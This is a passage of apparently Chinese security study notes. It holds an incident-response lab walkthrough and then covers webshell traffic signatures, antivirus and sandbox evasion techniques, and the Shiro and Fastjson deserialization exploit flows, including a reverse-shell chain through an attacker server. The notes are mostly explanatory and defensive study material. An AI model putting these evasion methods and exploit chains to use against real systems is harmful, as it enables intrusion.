755</p><blockquote><p>为了实现对用户权限的访问控制，一般限制配置文件权限分配不超过644，可执行文件不超过755</p></blockquote><p>可疑用户检查</p><p>找到uid为0的用户</p><p><img src="/2024/11/21/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/image-20240706215941452.png" alt="image-20240706215941452"></p><p><img src="/2024/11/21/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/image-20240706215835505.png" alt="image-20240706215835505"></p><p>权限分离</p><p>&#x2F;etc&#x2F;sudoers</p><p><img src="/2024/11/21/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/image-20240706220212180.png" alt="image-20240706220212180"></p><p>审计日志状态</p><p>systemctl status syslog</p><p><img src="/2024/11/21/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/image-20240706220505228.png" alt="image-20240706220505228"></p><p>sudo登录失败</p><p>cat &#x2F;var&#x2F;log&#x2F;auth.log.1 |grep zhangsan</p><p>内核版本</p><ul><li>uname -a</li><li>cat &#x2F;proc&#x2F;version</li><li>dmesg|grep -i Linux</li></ul><p>端口排查</p><p>netstat -antpl</p><p><img src="/2024/11/21/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/image-20240706221648613.png" alt="image-20240706221648613"></p><p>这里一直以为是在外联的2518 但是需要结合小皮面板找到5566恶意端口</p><p>xp 6进入小皮面板配置后查看</p><p>MYSQL</p><p>空口令 select user,authentication_string from mysql.user </p><p>密码复杂度 show variables like ‘validate%’</p><p>失败次数 show variables like ‘%connetction_control%’</p><p>超时时间 show variables like ‘%timeout%’</p><p>日志设置 show global variables like ‘%’</p><h2 id="linux-挖矿2"><a href="#linux-挖矿2" class="headerlink" title="linux-挖矿2"></a>linux-挖矿2</h2><p>系统别名查看</p><p>alias</p><p>后门用户</p><p>cat &#x2F;etc&#x2F;passwd|grep .*:.*:0:.*</p><p><img src="/2024/11/21/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/image-20240707152901974.png" alt="image-20240707152901974"></p><p>ssh后门日期</p><p>stat &#x2F;home&#x2F;admin&#x2F;.ssh&#x2F;authorized_keys</p><p>被篡改的环境变量文件</p><p>环境变量文件都在&#x2F;etc 和~目录下</p><p>find &#x2F;etc&#x2F; ~  -type f -mtime -T | xargs ls -la</p><h2 id="linux-algo挖矿"><a href="#linux-algo挖矿" class="headerlink" title="linux-algo挖矿"></a>linux-algo挖矿</h2><p>黑客ip</p><p>grep failed pass &#x2F;var&#x2F;log&#x2F;auth&#x2F;log.1</p><p>挖矿外联ip</p><p>1.netstat -pantu查看的不对</p><p>2.crontab -l计划任务找到dhcpd文件 </p><p><code>dhcpd</code></p><p><code>lsof /usr/bin/dhcpd</code></p><p><code>netstat -pantu|grep pid</code></p><p>然后还是错的。。。</p><p>权限维持</p><p>上面的dhcpd文件</p><p>黑客用户名</p><p>passwd中没有</p><p>找到&#x2F;root&#x2F;.ssh&#x2F;authorized_keys</p><h2 id="NOPTEAM-A"><a href="#NOPTEAM-A" class="headerlink" title="NOPTEAM A"></a>NOPTEAM A</h2><p>禅道版本查看</p><p>find &#x2F;opt&#x2F;zbox -type f -name “VER*”</p><p>cat xxx</p><p>攻击工具</p><p>&#x2F;opt下翻到fscan</p><p>黑客登录用户</p><p>网上找到exp复现 id结果为nobody</p><p>主机B账号密码<br>&#x2F;opt下&#x2F;gj目录保存了fscan结果</p><h2 id="流量分析-tomcat"><a href="#流量分析-tomcat" class="headerlink" title="流量分析-tomcat"></a>流量分析-tomcat</h2><p>攻击者ip</p><p>tcp协议发现可疑的syn扫描</p><p><img src="/2024/11/21/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/image-20240707172838610.png" alt="image-20240707172838610"></p><p>攻击者ip–ip反查即可</p><p>web服务端口–追踪tcp包</p><p>网站账号密码</p><p>发现唯一的post包</p><p><img src="/2024/11/21/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/image-20240707173225213.png" alt="image-20240707173225213"></p><p><img src="/2024/11/21/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/image-20240707173251952.png" alt="image-20240707173251952"></p>]]></content>
    
    
    <categories>
      
      <category>靶场</category>
      
    </categories>
    
    
    <tags>
      
      <tag>应急响应</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>web知识</title>
    <link href="/2024/09/16/web%E7%9F%A5%E8%AF%86/"/>
    <url>/2024/09/16/web%E7%9F%A5%E8%AF%86/</url>
    
    <content type="html"><![CDATA[<h1 id="WEB-知识点"><a href="#WEB-知识点" class="headerlink" title="WEB 知识点"></a>WEB 知识点</h1><p>用来记一些知识点的概念</p><p>最近主要学java安全</p><h1 id="绕沙箱"><a href="#绕沙箱" class="headerlink" title="绕沙箱"></a>绕沙箱</h1><ul><li>检查所有进程id，无常见进程则不运行</li><li>查注册表反虚拟机</li><li>IsDebuggerPresent反调试（非0则退出）</li><li>写入注册表开机启动</li><li>raw+aes</li><li>系统服务</li><li>转移</li></ul><h1 id="防溯源"><a href="#防溯源" class="headerlink" title="防溯源"></a>防溯源</h1><p><a href="https://github.com/aplyc1a/blogs/blob/master/%E8%BA%B2%E9%81%BF%E6%A3%80%E6%B5%8B/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E8%BA%AB%E4%BB%BD%E9%9A%90%E8%97%8F.md#31-%E5%B7%A5%E5%85%B7%E6%B5%81%E9%87%8F%E6%8C%87%E7%BA%B9">blogs&#x2F;躲避检测&#x2F;渗透测试中的身份隐藏.md at master · aplyc1a&#x2F;blogs (github.com)</a></p><h1 id="流量特征"><a href="#流量特征" class="headerlink" title="流量特征"></a>流量特征</h1><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/image-20250226151326739.png" alt="image-20250226151326739"></p><h2 id="cs-shellcode"><a href="#cs-shellcode" class="headerlink" title="cs shellcode"></a>cs shellcode</h2><p>1、RWX（可读可写可执⾏）权限的内存空间</p><p>2、异或密钥固定，3.x 是 0x69，4.x 是 0x2e</p><p>3、命名管道名称字符串</p><p>\\.\pipe\MSSE-1676-server</p><p>%c%c%c%c%c%c%c%cMSSE-%d-sever</p><h2 id="冰蝎"><a href="#冰蝎" class="headerlink" title="冰蝎"></a>冰蝎</h2><h3 id="重点"><a href="#重点" class="headerlink" title="重点"></a>重点</h3><p>1.0</p><ul><li>Content-Type: application&#x2F;octet-stream</li><li>Accpet头：application&#x2F;xhtml+xmlapplication&#x2F;xmlapplication&#x2F;signed-exchange</li></ul><p>2.0</p><ul><li>动态秘钥 </li><li>内置UA头</li><li>AES+BASE64</li><li>Content-Length: 16</li></ul><p>3.0</p><ul><li><p>默认密码 <strong>rebeyond</strong></p></li><li><p>content-type <strong>application&#x2F;octet-stream</strong></p></li><li><p>Accept 头<code>application/xhtml+xmlapplication/xmlapplication/signed-exchange</code></p></li></ul><p>4.0</p><ul><li>默认密码rebeyond</li><li>Accept : <strong>application&#x2F;json, text&#x2F;javascript, &#x2F;; q&#x3D;0.01</strong> 意思是浏览器可接受任何文件</li><li>大端口 长连接</li></ul><h3 id="1-0"><a href="#1-0" class="headerlink" title="1.0"></a>1.0</h3><p>1.Accpet 头 application&#x2F;xhtml+xmlapplication&#x2F;xmlapplication&#x2F;signed-exchange</p><p>2.<code>Content-Type: application/octet-stream</code> 这是一个强特征，查阅资料可知 octet-stream 的意思是，<strong>只能提交二进制，而且只能提交一个二进制，</strong>如果提交文件的话，只能提交一个文件,后台接收参数只能有一个，而且只能是流（或者字节数组），所以很少使用</p><h3 id="2-0"><a href="#2-0" class="headerlink" title="2.0"></a>2.0</h3><p>1.使用 <strong>AES+base64</strong>,AES 使用动态秘钥进行加密。</p><p>2.请求的时候内置了<strong>十几个 UA</strong> 头，（导致频繁变化）</p><p>3.<strong>Content-Length: 16</strong></p><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/ZkLLbV8PDoDXJ5xEqXUcebJKnJf.png"></p><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/NGMtbsH4IoqQNSxSmDFckIJxnhb.png"></p><h3 id="3-0"><a href="#3-0" class="headerlink" title="3.0"></a>3.0</h3><blockquote><p>在冰蝎中，任何请求，最终都会调用 Utils.getData 函数，对请求的参数加密。对于上传文件，命令执行来讲，加密的参数不定长。但是对于密钥交互，获取基本信息来讲，payload 都为定长，且无随机 padding。</p></blockquote><p>1.<strong>固定链接秘钥</strong></p><p>2.webshell 默认密码 <strong>rebeyond</strong>（md5(‘rebeyond’)[0:16]&#x3D;e45e329feb5d925b）</p><p>3.连接 jsp 的数据包 content-type常见为 <strong>application&#x2F;octet-stream</strong></p><p>4.Accept 头 <code>application/xhtml+xmlapplication/xmlapplication/signed-exchange</code></p><h3 id="4-0"><a href="#4-0" class="headerlink" title="4.0"></a>4.0</h3><p>1.取消连接密码，自定义传输协议算法</p><p>2.Accept 字段（弱特征）通常是: <strong>application&#x2F;json, text&#x2F;javascript, &#x2F;; q&#x3D;0.01</strong> 意思是浏览器可接受任何文件，但最倾向 application&#x2F;json 和 text&#x2F;javascript。</p><p>3.Content-Type 字段（弱特征），通常是 Content-type: Application&#x2F;x-www-form-urlencoded</p><p>4.连接使用本地端口在 49700 左右(<strong>就是比较大的端口</strong>)，每连接一次，每建立一次新的连接，端口就依次增加。<br>5.使用<strong>长连接</strong>，避免了频繁的握手造成的资源开销。默认情况下，请求头和响应头里会带有 Connection：Keep-Alive</p><p>6.固定的<strong>请求头和响应头</strong>，请求字节头：dFAXQV1LORcHRQtLRlwMAhwFTAg&#x2F;M ，响应字节头：TxcWR1NNExZAD0ZaAWMIPAZjH1BFBFtHThcJSlUXWEd</p><h2 id="哥斯拉"><a href="#哥斯拉" class="headerlink" title="哥斯拉"></a>哥斯拉</h2><p>类似冰蝎 2.0 的密钥交换方式，webshell 动态生成</p><p><a href="https://github.com/BeichenDream/Godzilla/releases">https://github.com/BeichenDream/Godzilla/releases</a></p><h3 id="重点-1"><a href="#重点-1" class="headerlink" title="重点"></a>重点</h3><ul><li>请求包pass&#x3D;”xxx”</li><li>响应包为 0</li><li>md5 前十六位 +base64+md5 后十六位。</li></ul><h3 id="静态特征"><a href="#静态特征" class="headerlink" title="静态特征"></a><strong>静态特征</strong></h3><p>  在默认脚本编码的情况下，jsp 会出现 xc、pass 字符和 Java 反射(ClassLoader，getClass().getClassLoader())，base64 加解码等特征。</p><h3 id="动态特征"><a href="#动态特征" class="headerlink" title="动态特征"></a><strong>动态特征</strong></h3><p>  1.Accept 字段（弱特征），默认是 <code>Accept:text/html, image/gif, image/jpeg, *; q=.2, /; q=.2</code><br>  2.Cookie 中有一个非常关键的特征，最后会有个分号。估计后续的版本会修复。<br>  3.响应体的数据有一定特征，哥斯拉会把一个 32 位的 md5 字符串按照一半拆分，分别放在 base64 编码的数据的前后两部分。整个响应包的结构体征为：<strong>md5 前十六位 +base64+md5 后十六位。</strong><br>  4.请求包长度 <strong>52541</strong><br>  5.以 <code>pass=“xxxx”</code> 开始请求包<br>  6.请求包较长，响应包为 0<br>  7.一个 tcp 包里面有三个 http<br>  8.一共 6 个 http 报文，3 去 3 回</p><h2 id="蚁剑"><a href="#蚁剑" class="headerlink" title="蚁剑"></a><strong>蚁剑</strong></h2><h3 id="重点-2"><a href="#重点-2" class="headerlink" title="重点"></a>重点</h3><ul><li>UA头 antsword xxx （在&#x2F;modules&#x2F;request.js中可修改）</li><li>@ini_set(“displyad_errors”,”0”)</li><li>_0x参数</li></ul><h3 id="静态特征-1"><a href="#静态特征-1" class="headerlink" title="静态特征"></a><strong>静态特征</strong></h3><p>  蚁剑中 php 使用 assert、eval 执行；asp 只有 eval 执行；在 jsp 使用的是 Java 类加载（ClassLoader），同时会带有 base64 编码解码等字符特征。</p><h3 id="动态特征-1"><a href="#动态特征-1" class="headerlink" title="动态特征"></a><strong>动态特征</strong></h3><p>  1.我们使用一句话木马上传 webshell，抓包后会发现每个请求体都存在以 <code>@ini_set(&quot;display_errors&quot;,&quot;0&quot;);@set_time_limit(0)</code> 开头。<br>  2.并且响应体的返回结果是 base64 编码发混淆字符，格式为：随机数 结果 随机数。<br>  3.参数名大多以“_0x…..&#x3D;”这种形式（下划线可替换为其他）所以，以_0x 开头的参数名，后面为加密数据的数据包也可识别为蚁剑的流量特征</p><p>​4.UA 头是 antsword xxx</p><h2 id="菜刀"><a href="#菜刀" class="headerlink" title="菜刀"></a><strong>菜刀</strong></h2><h3 id="重点-3"><a href="#重点-3" class="headerlink" title="重点"></a>重点</h3><ul><li><strong>base64</strong></li><li><strong>z0 z1参数</strong></li></ul><h3 id="动态特征-2"><a href="#动态特征-2" class="headerlink" title="动态特征"></a><strong>动态特征</strong></h3><p>  1.payload 在请求体中，采用 url 编码 +base64 编码，<strong>payload 部分是明文传输</strong>。<br>  2.payload 中有 eval 或 assert、base64_decode 这样的字符。<br>  3.payload 中有默认固定的&amp;z0&#x3D;QGluaV9zZXQ…这样 base64 加密的攻击载荷<br>  4.参数 <strong>z0</strong> 对应 <code>$_POST[z0]</code> 接收到的数据，且固定为 QGluaV9zZXQ 开头。<br>  5.进行 base64 解码后可看到代码：<code>@ini_set(&quot;display_errors&quot;,&quot;0&quot;);@set_time_limit(0);@set_magic_quotes_runtime(0);</code> 这段意思是首先关闭报错和 magic_quotes，接下来去获取主机的信息。</p><h1 id="web解析与编码"><a href="#web解析与编码" class="headerlink" title="web解析与编码"></a>web解析与编码</h1><p><a href="https://cloud.tencent.com/developer/article/1516371">浏览器解析与编码顺序及xss挖掘绕过全汇总-腾讯云开发者社区-腾讯云 (tencent.com)</a></p><h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><h3 id="url编码"><a href="#url编码" class="headerlink" title="url编码"></a>url编码</h3><p>%接ascil字符</p><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/image-20240627110534196.png" alt="image-20240627110534196"></p><h3 id="HTML编码"><a href="#HTML编码" class="headerlink" title="HTML编码"></a>HTML编码</h3><p>&amp;开头；结尾。</p><p>中间英文或者#后接十进制数或#x后接十六进制数。<img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/image-20240627110710381.png" alt="image-20240627110710381"></p><h3 id="JS编码"><a href="#JS编码" class="headerlink" title="JS编码"></a>JS编码</h3><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/image-20240627110719051.png" alt="image-20240627110719051"></p><h2 id="解析顺序"><a href="#解析顺序" class="headerlink" title="解析顺序"></a>解析顺序</h2><p>浏览器解析：（文档html解析生成DOM树和css样式表后）HTML解码，遇到&lt;script&gt;标签的时候将控制权交给JS引擎</p><p>由于需要先生成DOM树再解析html编码内容，所以不可以将标签进行html编码<img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/image-20240627111104232.png" alt="image-20240627111104232"></p><h2 id="解码顺序"><a href="#解码顺序" class="headerlink" title="解码顺序"></a>解码顺序</h2><p>HTML解码。JS解码。URL解码。</p><h1 id="APP"><a href="#APP" class="headerlink" title="APP"></a>APP</h1><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/image-20250116161827154.png" alt="image-20250116161827154"></p><p><a href="https://xz.aliyun.com/t/14037?time__1311=GqAxuDRD0D2AqGNPmxUo=D9DfhputYW4D#toc-2">APP测试保姆级教程 - 先知社区</a></p><p>过ROOT ：Frida-AntiRootDetection：hook底层禁止检测su（那么其实也可以直接hook对应检测函数），Apatch框架，还有狐狸面具+shamiko、KSU框架都可以过root检测</p><p>绕过frida：二开，先开应用再开frida</p><p>抓包代理：根证书手动设置，SSLUnpinning和算法助手</p><p>脱壳：为了可以用jadx反编译，先用MT管理器或者找一些文件资源的功能点查壳，然后用Fundex等软件脱壳</p><p>HOOK函数：Frida（hluda） </p><h1 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h1><h2 id="免杀方法"><a href="#免杀方法" class="headerlink" title="免杀方法"></a><strong>免杀方法</strong></h2><ol><li>修改特征码，猜测杀软对哪几个字节进行查杀，再对应修改（几乎没用了）</li><li>shellcode 加载器，改变加载到内存的方式和加密方式（主流）(分离免杀)</li><li>反射 dll 加载，把 dll 加密，远程下载到内存中再解密执行（高级）</li></ol><h3 id="无文件执行木马的方式有哪些？"><a href="#无文件执行木马的方式有哪些？" class="headerlink" title="无文件执行木马的方式有哪些？"></a><strong>无文件执行木马的方式有哪些？</strong></h3><p>powershell（脚本解析器） 》》》powershell.exe（应用程序）</p><p>VB.script（脚本解析器） 》》》cscript.exe（应用程序）</p><p>bat 处理 （脚本解析器） 》》》cmd.exe（应用程序）</p><p>javaSrtipt（脚本解析器） 》》》mshta.exe（应用程序）</p><h3 id="怎么做-shellcode-免杀？"><a href="#怎么做-shellcode-免杀？" class="headerlink" title="怎么做 shellcode 免杀？"></a><strong>怎么做 shellcode 免杀？</strong></h3><ol><li>编码</li><li>加壳</li><li>混淆</li><li>分离免杀</li><li>特征码修改</li><li>添加无用逻辑语句</li><li>重写 api</li></ol><h3 id="分离免杀怎么做？"><a href="#分离免杀怎么做？" class="headerlink" title="分离免杀怎么做？"></a><strong>分离免杀怎么做？</strong></h3><p>分为加载器和 shellcode 两部分，一般将 shellcode 存储在网页或者图片中，然后加载器远程加载存在 shellcode 的网页或者图片之类的</p><h3 id="powershell-怎么远程加载？"><a href="#powershell-怎么远程加载？" class="headerlink" title="powershell 怎么远程加载？"></a><strong>powershell 怎么远程加载？</strong></h3><p>可以远程加载 mimikazt，远控文件，exe 可执行文件实现无文件落地</p><h2 id="Webshell"><a href="#Webshell" class="headerlink" title="Webshell"></a>Webshell</h2><p>1.高版本 php 不换行执行命令</p><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/LhlcbHJYfoayMNxlaQScjwZXn9c.png"></p><p>2.\报错</p><p>3.十六进制字符串（php7 不是数字，php5 是）</p><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/Cuk1bYq8Boq2zqxstKXcOMWvnNd.png"></p><p>4.jspx CDATA 特性</p><blockquote><p>jsp 的后缀可以兼容为 jspx 的代码，也兼容 jspx 的所有特性，如 CDATA 特性 jspx 的后缀不兼容为 jsp 的代码，jspx 只能用 jspx 的格式 在 XML 元素里，&lt; 和&amp;是非法的，遇到 &lt; 解析器会把该字符解释为新元素的开始，遇到&amp;解析器会把该字符解释为字符实体化编码的开始 但是我们有时候有需要在 jspx 里添加 js 代码用到大量的 &lt; 和&amp;字符，因此可以将脚本代码定义为 CDATA CDATA 部分内容会被解析器忽略，此时 ameter 依旧会与 getPar 拼接成为 getParameter。</p></blockquote><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/YoZbbi8F5owxFqx29Ajcura9ndb.png"></p><p>5.实体化编码</p><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/GGJgbeXjJozLdNxmIdscfVaXnJe.png"></p><p>6.其他编码格式</p><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/GQz6bAqwuoEeocxKyUfcHWaVnnh.png"></p><h2 id="msf-cs"><a href="#msf-cs" class="headerlink" title="msf&#x2F;cs"></a>msf&#x2F;cs</h2><p>1.shellcode 加密</p><p>2.垃圾字节</p><p>3.硬编码单字节秘钥进行运算</p><p>4.移位</p><p>5.交换连续字节</p><h2 id="沙盒免杀"><a href="#沙盒免杀" class="headerlink" title="沙盒免杀"></a>沙盒免杀</h2><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/UIlfbtq5QozI0KxTerbc0YX2n4f.png"></p><h1 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h1><h2 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h2><blockquote><p>base 加密网站 <a href="https://ares-x.com/tools/runtime-exec">Runtime.exec Payload Generater | AresX’s Blog (</a><a href="https://ares-x.com/tools/runtime-exec">ares-x.com</a><a href="https://ares-x.com/tools/runtime-exec">)</a></p></blockquote><blockquote><p>java-web 内存马 <a href="https://www.freebuf.com/articles/web/274466.html">https://www.freebuf.com/articles/web/274466.html</a></p></blockquote><p><strong>rO0AB：base64 加密的 java 对象</strong></p><blockquote><p><a href="https://xz.aliyun.com/t/7079">https://xz.aliyun.com/t/7079</a><br><a href="https://xz.aliyun.com/t/7264">https://xz.aliyun.com/t/7264</a></p></blockquote><h3 id="JNDI-Java-命名和目录接口"><a href="#JNDI-Java-命名和目录接口" class="headerlink" title="JNDI(Java 命名和目录接口)"></a>JNDI(Java 命名和目录接口)</h3><p>JNDI 是一个接口，在这个接口下会有多种目录系统服务的实现，我们能名称等去找到相关的对象，并把它下载到客户端中来。—DNS OR LDAP</p><h3 id="RMI-远程方法调用"><a href="#RMI-远程方法调用" class="headerlink" title="RMI(远程方法调用)"></a>RMI(远程方法调用)</h3><h4 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h4><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/image-20250202225314678.png" alt="image-20250202225314678"></p><p>RMI 实现了 java 利用远程服务器为具体的 java 方法提供接口，本地只需要根据接口类的定义来提供参数即可调用，依靠 <strong>JRMP(远程方法协议)</strong></p><h4 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h4><p>1.传输的类必须可序列化</p><p>2.客户端服务器的 serialVersionUID 字段相同，</p><p>3.被远程调用方法的对象一定要实现 java.rmi.remote 接口，</p><p>远程对象实现类必须继承 UnicastRemoteObject 类（或者构造方法调用 UnicastRemoteObject.exportObject()静态方法）</p><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/TB3zb4yneoiyxsx134scH38Mngc.png"></p><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/PdyMb33REou8X1xZiL3cCVjPnMh.png"></p><h4 id="运行逻辑"><a href="#运行逻辑" class="headerlink" title="运行逻辑"></a>运行逻辑</h4><p>0.JDK 提供注册表功能，创建 RMIRegistry 对象监听 1099 端口</p><p>手动注册如下</p><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/WC0NbySPLoRKBpxd60QcflHbnKd.png"></p><p>1.服务器随机监听一个端口</p><p>2.客户端的 stub 通过 JRMP 协议封装数据,调用了上面的方法</p><p>3.连接服务端并提交参数</p><p>4.执行方法 返回结果给客户端</p><h2 id="shiro-反序列化"><a href="#shiro-反序列化" class="headerlink" title="shiro 反序列化"></a>shiro 反序列化</h2><p>(apache 安全框架）</p><h3 id="Shior550"><a href="#Shior550" class="headerlink" title="Shior550"></a>Shior550</h3><blockquote><p><a href="https://blog.csdn.net/Aaron_Miller/article/details/106475088">https://blog.csdn.net/Aaron_Miller&#x2F;article&#x2F;details&#x2F;106475088</a></p></blockquote><p><strong>取出请求包中 rememberMe 的 cookie 值 &#x3D;&gt; Base64 解码&#x3D;&gt;AES 解密（用到密钥 key,硬编码）&#x3D;&gt; 反序列化</strong>。知道了秘钥就可以控制反序列化的内容来构造链子</p><p>则 payload 构造：序列化&#x3D;&gt;AES 加密&#x3D;&gt;BASE64&#x3D;&gt; 写入 cookie</p><p>条件：获取 key，存在攻击链</p><blockquote><p>流程：攻击者搭建恶意 vps，存放反弹 shell（经过 base64 加密并且反序列化工具处理！这里的 base64 加密跟服务器无关，应该是为了免杀跟避免编码问题）的 payload1 并进行 JRMPListener，将上述 VPS JRMPListener 的地址进行 AES 加密和 base64 编码，构造请求包 cookie 中的 rememberMe 字段，向存在漏洞的服务器发送加密编码后的结果 payload2。<br>服务器接收到 payload2 进程 base64 解码 AES 解密，反序列化过程中触发 pop 链造成 payload2 中的语句执行，发现要和恶意 VPS 的 JRMP 通信，请求的过程中接收到了反弹 shell 的 payload1。</p></blockquote><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/Rfedb2I1KoKqtAx3twfcd87FnTa.png"></p><h3 id="Shiro721"><a href="#Shiro721" class="headerlink" title="Shiro721"></a>Shiro721</h3><blockquote><p>由于 Apache Shiro cookie 中通过 AES-128-CBC 模式加密的 rememberMe 字段存在问题，用户可通过 Padding Oracle 加密生成的攻击代码来构造恶意的 rememberMe 字段，并重新请求网站，进行反序列化攻击，最终导致任意代码执行</p></blockquote><p>条件：合法 cookie，攻击链</p><p>在一个合法的cookie后面，利用aes加解密机制往后填充恶意数据</p><h3 id="绕waf"><a href="#绕waf" class="headerlink" title="绕waf"></a>绕waf</h3><p>利用http请求头：请求头修改随机字符，置空</p><p>利用shiro特性：rememberMe脏数据，空白字符</p><p>绕过waf监控的对象：Host改ip 利用ipv6 </p><h2 id="fastjson-反序列化"><a href="#fastjson-反序列化" class="headerlink" title="fastjson 反序列化"></a>fastjson 反序列化</h2><p>（json 跟 java 对象转换库）</p><blockquote><p><a href="https://blog.csdn.net/Bossfrank/article/details/130100893">https://blog.csdn.net/Bossfrank/article/details/130100893</a></p></blockquote><p>要求：RMI 服务的开启（x）,没过滤 json 格式，1.2.24&lt;fastjson 版本&lt;1.2.80</p><h3 id="fastjson-查看版本"><a href="#fastjson-查看版本" class="headerlink" title="fastjson 查看版本"></a>fastjson 查看版本</h3><p><a href="https://www.cnblogs.com/forforever/p/16537846.html">fastjson反序列化漏洞区分版本号的方法总结 - komomon - 博客园</a></p><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/KWtlbPdXSoJd9gxjZo9cC6opnnh.png"></p><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/Kpbcb10APoZLuQxqpoJcQrfgnwd.png"></p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>Fastjson 可以操作任何 Java 对象，<strong>即使是一些预先存在的没有源码的对象</strong></p><p>AutoType 功能(代替了 setter&#x2F;getter，当多个类继承同一类，又有同名属性，需要AutoType去指明他原始类)，fastjson 在对 json 字符串反序列化的时候，<strong>会读取到 @type 的内容，将 json 内容反序列化为 java 对象并调用这个类的 setter 方法</strong>。</p><h3 id="攻击分类"><a href="#攻击分类" class="headerlink" title="攻击分类"></a>攻击分类</h3><p>1.JNDI打：（JdbcRowSetImpl链）我们搭建一个远程恶意站点，然后构造语句去让服务器反序列的时候访问 rmi 服务器，rmi 服务器来执行我们在恶意站点上的 class 文件</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">setAutoCommit</span>--&gt;</span>lookup<br></code></pre></td></tr></table></figure><p>2.传入恶意的 TemplatesImpl 类，而这个类有一个字段就是_bytecodes，有部分函数会根据这个_bytecodes 生成 java 实例，这就达到 fastjson 通过字段传入一个类，再通过这个类被生成时执行构造函数</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">getOutputProperties</span>--&gt;</span><span class="hljs-function"><span class="hljs-title">newTransformer</span>--&gt;</span><span class="hljs-function"><span class="hljs-title">getTransletInstance</span>--&gt;</span>newInstance<br>(_bytecodes不为null，父类为ABSTRACT_TRANSLET)<br></code></pre></td></tr></table></figure><h3 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h3><p>1.一种是直接将命令执行结果写入到静态资源文件里，如 html、js 等，然后通过 http 访问就可以直接看到结果</p><p>2.通过 dnslog 进行数据外带，但如果无法执行 dns 请求就无法验证了</p><p>3.直接将命令执行结果回显到请求 Poc 的 HTTP 响应中</p><h3 id="各版本"><a href="#各版本" class="headerlink" title="各版本"></a>各版本</h3><p><a href="https://xz.aliyun.com/t/14872?time__1311=GqA2Y50K4IxBqDwqeqBKKiISDWT4zWxaroD#toc-4">Java中Fastjson各版本漏洞对抗史与总结 - 先知社区</a></p><p><a href="https://xz.aliyun.com/t/13386?time__1311=GqmxuiDQ0=D=G=D/briQdnSxfhWyDg7j7oD#toc-23">完全零基础入门Fastjson系列漏洞（基础篇） - 先知社区</a></p><p>首先要知道fastjson反序列化的时候通过AutoType去寻找对应类getter setter is 构造函数等方法并调用</p><h4 id="TemplatesTmpl链"><a href="#TemplatesTmpl链" class="headerlink" title="TemplatesTmpl链"></a>TemplatesTmpl链</h4><p>首先解释<strong>TemplatesTmpl本身的安全威胁</strong></p><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/20240618171234-e65c2f2c-2d52-1.png" alt="img"></p><p>TemplatesTmpl包的getTransletInstance方法对于成员属性_class下标为_transletIndexdex类进行实例化</p><p>然后跟<strong>链子</strong></p><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/image-20241129094601977.png" alt="image-20241129094601977"></p><p>一直往上分析，可以发现就是_1属性的getter方法</p><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/image-20241129094707370-17328448279952.png" alt="image-20241129094707370"></p><p>来到赋值类，_class类可控但是要求_bytecodes不为null，父类为ABSTRACT_TRANSLET</p><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/image-20241129094818483-17328448989563.png" alt="image-20241129094818483"></p><h4 id="JdbcRowSetImpl链"><a href="#JdbcRowSetImpl链" class="headerlink" title="JdbcRowSetImpl链"></a>JdbcRowSetImpl链</h4><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/image-20250305084155782.png" alt="image-20250305084155782"></p><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/image-20241129095125508.png" alt="image-20241129095125508"></p><p>好理解很多，setAutoCommit方法会调this.connect(当this.conn空),然后调用了lookup(this.getDataSourceName)</p><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/image-20241129095258496.png" alt="image-20241129095258496"></p><p>发现还存在一个setDataSourceName方法导致DataSourceName可控</p><h3 id="绕过"><a href="#绕过" class="headerlink" 